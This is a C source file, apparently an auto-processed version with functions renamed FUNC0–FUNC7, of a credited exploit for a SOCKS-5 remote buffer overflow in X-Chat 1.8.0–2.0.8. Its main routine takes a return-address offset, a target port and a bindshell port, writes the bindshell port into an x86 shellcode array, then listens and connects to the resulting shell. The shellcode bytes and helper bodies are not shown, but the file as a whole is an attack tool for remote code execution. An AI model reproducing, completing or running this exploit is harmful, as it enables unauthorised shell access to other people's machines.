#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int BSEADDR ; 
 int BUFSIZE ; 
 unsigned short DFLPORT ; 
 unsigned short DFLSPRT ; 
 unsigned int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (char*,unsigned short) ; 
 int /*<<< orphan*/  FUNC3 (char*,int) ; 
 int /*<<< orphan*/  FUNC4 (char*,...) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 char* FUNC6 (unsigned short,unsigned int) ; 
 unsigned short* x86_exec ; 

int FUNC7(int argc,char **argv){
 unsigned short port=DFLPORT,sport=DFLSPRT;
 unsigned int retaddr=BSEADDR;
 char *hostptr;
 if(BUFSIZE<0||BUFSIZE>255)FUNC3("BUFSIZE must be 1-255(char/int8).",1);
 FUNC4("[*] X-Chat[v1.8.0-v2.0.8]: socks-5 remote buffer overflow exp"
 "loit.\n[*] by: by: vade79/v9 v9 fakehalo deadpig org (fakehalo)\n\n");
 if(argc<2){
  FUNC4("[!] syntax: %s <offset from 0x%.8x> [port] [shell port]\n\n",
  argv[0],BSEADDR);
  FUNC1(1);
 }
 if(argc>1)retaddr-=FUNC0(argv[1]);
 if(argc>2)port=FUNC0(argv[2]);
 if(argc>3)sport=FUNC0(argv[3]);
 x86_exec[20]=(sport&0xff00)>>8;
 x86_exec[21]=(sport&0x00ff);
 FUNC4("[*] eip: 0x%.8x, socks-5 port: %u, bindshell port: %u.\n",
 retaddr,port,sport);
 hostptr=FUNC6(port,retaddr);
 FUNC5(1);
 FUNC2(hostptr,sport);
 FUNC1(0);
}